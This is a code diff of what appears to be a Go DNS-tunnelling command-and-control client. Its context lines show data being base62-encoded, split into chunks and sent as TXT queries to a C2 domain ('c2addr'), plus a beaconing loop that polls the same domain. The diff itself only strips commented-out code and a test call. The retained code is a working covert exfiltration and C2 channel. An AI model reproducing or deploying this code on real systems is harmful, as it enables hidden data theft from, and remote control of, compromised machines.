@@ -28,7 +28,6 @@ func send(data []byte, packnumer string, mapnumer string, ch chan bool) {
 	defer wg.Done()
 	trytimes := 0
 	ch <- true
-	//if (float64(len(data))*1.35 + float64(len(c2addr)+len(packnumer)+1+1+6)) < (payloadlen) {
 	m := new(dns.Msg)
 	m.SetQuestion(packnumer+"-"+mapnumer+"-"+string(base62.Encode(data))+c2addr, dns.TypeTXT)
 	//cl := &dns.Client{}
@@ -56,7 +55,6 @@ SEND1:
 		goto SEND1
 	}
 
-	//}
 	<-ch
 }
 func senddata(data []byte, packnumer string) {
@@ -85,40 +83,12 @@ func senddata(data []byte, packnumer string) {
 			} else {
 				tempdata = data[(i * limitlen):]
 			}
-			//m := new(dns.Msg)
 			if i != (times - 1) {
-				//m.SetQuestion(packnumer+"-"+strconv.FormatInt(int64(i), 16)+"-"+string(base62.Encode([]byte(tempdata)))+c2addr, dns.TypeTXT)
 				wg.Add(1)
 				go send(tempdata, packnumer, strconv.FormatInt(int64(i), 16), ch)
 			} else {
-				//m.SetQuestion(packnumer+"-ffffff-"+string(base62.Encode([]byte(tempdata)))+c2addr, dns.TypeTXT)
 			}
 
-			/*
-					println(packnumer + "-" + strconv.FormatInt(int64(i), 16) + "-" + string(base62.Encode([]byte(tempdata))) + c2addr)
-					cl := &dns.Client{}
-				SEND:
-					in, _, err := cl.Exchange(m, addrstr)
-					if err != nil {
-						println("conn err retry")
-						if trytimes > retry {
-							println("senddata err")
-							return
-						}
-						trytimes += 1
-						goto SEND
-
-					}
-					if in == nil || in.Rcode != dns.RcodeSuccess {
-						println("invalid answer retry")
-						if trytimes > retry {
-							println("senddata err ")
-							return
-						}
-						trytimes += 1
-						goto SEND
-					}
-			*/
 		}
 		wg.Wait()
 		wg.Add(1)
@@ -131,26 +101,6 @@ func main() {
 
 	m := new(dns.Msg)
 	m.SetQuestion(strconv.FormatInt(int64(time.Now().Unix()), 16)+c2addr, dns.TypeTXT)
-
-	//cl := &dns.Client{Net: "tcp-tls"}
-	//cl := &dns.Client{}
-
-	/*
-		e := new(dns.EDNS0_SUBNET) //EDNS
-		e.Code = dns.EDNS0SUBNET
-		e.Family = 1
-		e.SourceNetmask = 24
-		e.Address = net.ParseIP("1.1.1.1").To4()
-		e.SourceScope = 0
-		o.Option = append(o.Option, e)
-	*/
-	//	o := new(dns.OPT)
-	//	o.Hdr.Name = "."
-	//	o.Hdr.Rrtype = dns.TypeOPT
-	//	e := new(dns.EDNS0_LOCAL)
-	//	e.Code = dns.EDNS0LOCALSTART
-	//	e.Data = []byte{72, 82, 74}
-	//	o.Option = append(o.Option, e)
 
 	for {
 
@@ -204,8 +154,5 @@ func main() {
 		}
 		time.Sleep(time.Second * time.Duration(sleep))
 	}
-	//log.Println(in)
-	//log.Println(a)
-	senddata([]byte("123456789123456789123456789123456789"), " ")
 
 }
